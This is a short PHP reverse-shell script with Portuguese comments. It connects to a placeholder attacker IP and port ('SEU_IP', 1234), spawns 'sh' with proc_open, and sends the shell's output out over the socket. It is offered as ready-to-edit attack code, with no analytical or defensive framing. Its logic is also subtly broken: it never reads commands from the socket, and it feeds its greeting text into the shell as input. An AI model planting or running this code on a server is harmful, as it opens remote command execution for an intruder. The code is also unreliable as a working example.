<?php
    $ip = 'SEU_IP'; // altere para o IP da sua máquina
    $port = 1234; // altere para a porta que deseja usar

    $socket = fsockopen($ip, $port);
    $msg = "Shell iniciada em ". getcwd();

    if (!$socket) {
        $msg = "Erro ao conectar no IP e porta.";
    } else {
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin é um pipe que o filho lerá
            1 => array("pipe", "w"),  // stdout é um pipe que o filho escreverá
            2 => array("pipe", "w")   // stderr é um pipe que o filho escreverá
        ); // o código cria um processo filho para iniciar o shell

        $process = proc_open('sh', $descriptorspec, $pipes, getcwd());

        if (is_resource($process)) {
            fwrite($pipes[0], $msg);
            fclose($pipes[0]);

            while ($line = fgets($pipes[1])) {
                echo $line;
                fwrite($socket, $line);
            }

            fclose($pipes[1]);
            fclose($socket);
            proc_close($process);
        }
    }
?>